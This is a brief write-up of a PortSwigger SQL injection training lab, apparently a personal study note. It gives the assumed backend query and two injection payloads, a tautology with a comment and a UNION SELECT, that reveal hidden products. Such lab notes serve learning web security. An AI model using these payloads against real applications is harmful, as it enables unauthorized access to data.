

Link=  https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

![image](https://github.com/user-attachments/assets/c8b2c847-5855-47f3-b518-de00b813e6ff)

End_Goal= We have to display all the products from the site regardless it is Released  or Not

Backend_Query= SELECT * FROM products WHERE category = ‘Gifts’ AND released = 1

Solution 1 = ' OR 1=1 -- 
			
![image](https://github.com/user-attachments/assets/652f3d0b-9078-4c63-a9de-776dc209fc05)

   
Solution 2 = ' UNION SELECT * FROM products -- 
(table_name=products)


![image](https://github.com/user-attachments/assets/2adb4821-552b-4d35-9ef5-f33dea786446)




